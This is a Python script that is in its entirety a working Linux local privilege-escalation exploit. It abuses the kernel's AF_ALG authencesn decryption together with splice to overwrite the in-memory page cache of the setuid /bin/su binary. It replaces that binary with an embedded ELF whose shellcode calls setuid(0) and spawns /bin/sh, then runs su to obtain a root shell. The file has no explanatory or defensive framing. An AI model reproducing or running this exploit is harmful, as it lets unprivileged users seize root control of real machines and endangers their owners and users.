#!/usr/bin/env python3
import os
import socket

SOL_ALG           = 279
ALG_SET_KEY       = 1
ALG_SET_AUTHSIZE  = 5
ALG_SET_OP        = 3
ALG_SET_IV        = 2
ALG_SET_ASSOCLEN  = 4

# authencesn(hmac(sha256), cbc(aes)) key layout:
#   rtattr header (8 bytes): rta_len=8, rta_type=CRYPTO_AUTHENC_KEYA_PARAM, enckeylen=16
#   + 16-byte HMAC-SHA256 key (all zeros)
#   + 16-byte AES-128 key    (all zeros)
AEAD_KEY     = bytes.fromhex("0800010000000010") + b"\x00" * 32
AUTH_TAG_LEN = 4
IV_LEN       = 16
ASSOC_LEN    = 8

def write_4bytes(fd, target_offset, chunk):
    alg_sock = socket.socket(38, socket.SOCK_SEQPACKET, 0)  # 38 = AF_ALG
    alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, AEAD_KEY)
    alg_sock.setsockopt(SOL_ALG, ALG_SET_AUTHSIZE, None, AUTH_TAG_LEN)
    op_sock, _ = alg_sock.accept()

    splice_len = target_offset + 4

    # AAD = seqno_hi (ignored) || seqno_lo (the 4 bytes we want written)
    aad = b"\x00" * 4 + chunk
    ancdata = [
        (SOL_ALG, ALG_SET_OP,      (0).to_bytes(4, "little")),        # decrypt
        (SOL_ALG, ALG_SET_IV,      IV_LEN.to_bytes(4, "little") + b"\x00" * IV_LEN),
        (SOL_ALG, ALG_SET_ASSOCLEN, ASSOC_LEN.to_bytes(4, "little")),
    ]
    op_sock.sendmsg([aad], ancdata, 32768)  # 32768 = MSG_MORE

    pipe_r, pipe_w = os.pipe()
    os.splice(fd, pipe_w, splice_len, offset_src=0)
    os.splice(pipe_r, op_sock.fileno(), splice_len)

    try:
        op_sock.recv(ASSOC_LEN + target_offset)
    except OSError:
        pass

    os.close(pipe_r)
    os.close(pipe_w)
    op_sock.close()
    alg_sock.close()

# Minimal x86-64 ELF: setuid(0) + execve("/bin/sh", NULL, NULL)
# Entry point is 0x400078, which is right after the ELF + program headers.
PAYLOAD_ELF = (
    # --- ELF header (64 bytes) ---
    b"\x7f\x45\x4c\x46\x02\x01\x01\x00"  # magic, 64-bit, LE, ELF version 1
    b"\x00\x00\x00\x00\x00\x00\x00\x00"  # OS/ABI = UNIX System V, padding
    b"\x02\x00\x3e\x00\x01\x00\x00\x00"  # ET_EXEC, EM_X86_64, e_version = 1
    b"\x78\x00\x40\x00\x00\x00\x00\x00"  # e_entry   = 0x400078
    b"\x40\x00\x00\x00\x00\x00\x00\x00"  # e_phoff   = 0x40 (right after this header)
    b"\x00\x00\x00\x00\x00\x00\x00\x00"  # e_shoff   = 0 (no section headers)
    b"\x00\x00\x00\x00\x40\x00\x38\x00"  # e_flags=0, e_ehsize=64, e_phentsize=56
    b"\x01\x00\x00\x00\x00\x00\x00\x00"  # e_phnum=1, e_shentsize/shnum/shstrndx=0
    # --- Program header (56 bytes) ---
    b"\x01\x00\x00\x00\x05\x00\x00\x00"  # p_type = PT_LOAD, p_flags = PF_R|PF_X
    b"\x00\x00\x00\x00\x00\x00\x00\x00"  # p_offset = 0 (load from start of file)
    b"\x00\x00\x40\x00\x00\x00\x00\x00"  # p_vaddr  = 0x400000
    b"\x00\x00\x40\x00\x00\x00\x00\x00"  # p_paddr  = 0x400000
    b"\x9e\x00\x00\x00\x00\x00\x00\x00"  # p_filesz = 158
    b"\x9e\x00\x00\x00\x00\x00\x00\x00"  # p_memsz  = 158
    b"\x00\x10\x00\x00\x00\x00\x00\x00"  # p_align  = 0x1000
    # --- Shellcode at 0x400078 (entry point) ---
    b"\x31\xc0\x31\xff"                   # xor eax, eax  /  xor edi, edi
    b"\xb0\x69\x0f\x05"                   # mov al, 105   /  syscall  → setuid(0)
    b"\x48\x8d\x3d\x0f\x00\x00\x00"      # lea rdi, [rip+15]  → points to "/bin/sh"
    b"\x31\xf6"                           # xor esi, esi
    b"\x6a\x3b\x58\x99"                   # push 59  /  pop rax  /  cdq  → SYS_execve, rdx=0
    b"\x0f\x05"                           # syscall  → execve("/bin/sh", NULL, NULL)
    b"\x31\xff\x6a\x3c\x58"              # xor edi, edi  /  push 60  /  pop rax  → SYS_exit
    b"\x0f\x05"                           # syscall  → exit(0)
    b"\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # "/bin/sh\0"
    b"\x00\x00"                           # pad to 4-byte boundary
)

def main():
    target_fd = os.open("/bin/su", os.O_RDONLY)

    offset = 0
    while offset < len(PAYLOAD_ELF):
        write_4bytes(target_fd, offset, PAYLOAD_ELF[offset:offset + 4])
        offset += 4

    os.close(target_fd)
    os.system("su")

main()
